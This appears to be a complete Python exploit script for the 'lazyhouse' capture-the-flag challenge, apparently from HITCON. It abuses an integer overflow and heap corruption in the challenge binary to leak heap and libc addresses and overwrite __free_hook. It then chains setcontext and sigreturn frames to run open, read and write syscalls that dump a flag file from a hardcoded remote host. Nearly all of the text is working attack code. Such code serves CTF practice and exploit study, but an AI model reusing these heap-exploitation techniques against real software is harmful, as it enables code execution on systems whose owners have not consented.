#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './lazyhouse'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file], 'aslr':False}, \
                        remote  = {'host':'3.115.121.123', 'port':5731})
                        # remote  = {'host':'localhost', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_set_rdx     = 0x0012be97

#==========

def attack(conn, **kwargs):
    lh = LazyHouse(conn)

    # OKUMAN CHOJA!
    lh.buy(0, (1<<64)/218 + 1)
    lh.sell(0)

    lh.buy(7, 0xe0, '_')

    lh.buy(1, 0x90, 'a')
    lh.buy(2, 0x90, 'b')
    lh.buy(3, 0x90, 'c'*0x10 + p64(0xc0) + p64(0x20))

    lh.buy(5, 0x90, 'd')
    lh.buy(6, 0x90, 'e')

    for _ in range(7):
        lh.buy(0, 0x90, '0')
        lh.sell(0)
    for _ in range(7):
        lh.buy(0, 0xb0, '1')
        lh.sell(0)
    lh.buy(0, 0x217, '2')
    lh.sell(0)

    lh.sell(2)

    lh.upgrade(1, 'a'*0x98+p64(0xc1))
    lh.buy(0, 0xb0, 'b'*0x98 + p64(0xa1))

    lh.sell(1)
    lh.sell(3)

    leak = lh.show(0)[-16:]

    global addr_heap_base
    addr_heap_base = u64(leak[0:8]) - 0x340
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena = u64(leak[8:16]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_setcontext= libc.sep_function['setcontext']
    addr_libc_set_rdx   = libc.address + offset_libc_set_rdx

    lh.buy(1, 0x90, 'a')
    lh.buy(3, 0x90, 'c'*0x10 + p64(0xc0) + p64(0x21) + 'c'*0x18 + p64(0x21))

    lh.sell(0)
    lh.buy(0, 0xb0, 'b'*0x98 + p64(0xda1))
    lh.sell(3)

    # make fake chunk in tcache manage area and double links correct
    lh.buy(2, 0x80, 'c'*0x18 + p64(0x21) + 'c'*0x18 + p64(0x21))
    lh.buy(3, 0x90, p64(0) + p64(0x21) + 'x'*0x18 + p64(addr_heap_base + 0x40))
    lh.buy(4, 0x90, p64(0) + p64(0x31) + 'y'*0x10 + p64(addr_heap_base + 0x40))
    lh.sell(5)
    lh.sell(6)

    lh.buy(5, 0x390, 'X')
    lh.sell(5)
    lh.sell(4)
    lh.sell(3)
    lh.sell(2)
    for _ in range(3):
        lh.buy(2, 0x3a0, 'Y')
        lh.sell(2)
    lh.upgrade(7, '_'*0xe0 + p64(0x300) + p64(0xa0))
    lh.sell(7)
    lh.sell(1)

    lh.buy(1, 0x130, '_')
    lh.buy(2, 0xf0, '0')
    lh.buy(3, 0x80, p64(addr_libc_free_hook))
    lh.sell(0)

    if env.check('remote'):
        lh.super(p64(addr_libc_set_rdx))
    else:
        lh.super(p64(addr_libc_setcontext + 0x57))

    lh.syscall(constants.SYS_read, [constants.STDIN_FILENO, addr_heap_base, 0x100])
    conn.send('/home/lazyhouse/flag\x00')
    lh.syscall(constants.SYS_open, [addr_heap_base, 0, -1])
    lh.syscall(constants.SYS_read, [3, addr_heap_base, 0x100])
    lh.syscall(constants.SYS_write, [constants.STDOUT_FILENO, addr_heap_base, 0x100])

class LazyHouse:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.syscall_cnt    = 0

    def buy(self, idx, size, data = None):
        self.sendlineafter('choice: ', '1')
        self.sendlineafter('Index:', str(idx))
        self.sendlineafter('Size:', str(struct.unpack('<q', p64(size))[0]))
        if data is not None:
            self.sendafter('House:', data)

    def show(self, idx):
        self.sendlineafter('choice: ', '2')
        self.sendlineafter('Index:', str(idx))
        return self.recvuntil('$$$$$$$$', drop=True)

    def sell(self, idx):
        self.sendlineafter('choice: ', '3')
        self.sendlineafter('Index:', str(idx))

    def upgrade(self, idx, data):
        self.sendlineafter('choice: ', '4')
        self.sendlineafter('Index:', str(idx))
        self.sendafter('House:', data)

    def super(self, data):
        self.sendlineafter('choice: ', '5')
        self.sendafter('House:', data)

    def syscall(self, sysno, args):
        frame = SigreturnFrame()
        frame.rdi = sysno
        frame.rsi = args[0]
        frame.rdx = args[1]
        frame.rcx = args[2]
        frame.rip = libc.symbols['syscall']

        self.buy(0, 0xa0, p64(libc.sep_function['setcontext']+0x57) + p64(addr_heap_base+0x1e0 + 0xb0*self.syscall_cnt - 0x10) + str(frame)[0x20:0xb0])
        self.sell(0)
        self.syscall_cnt += 1

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # hitcon{from_sm4llbin_2_tc4hc3_from_tcach3_to_RCE}

#==========
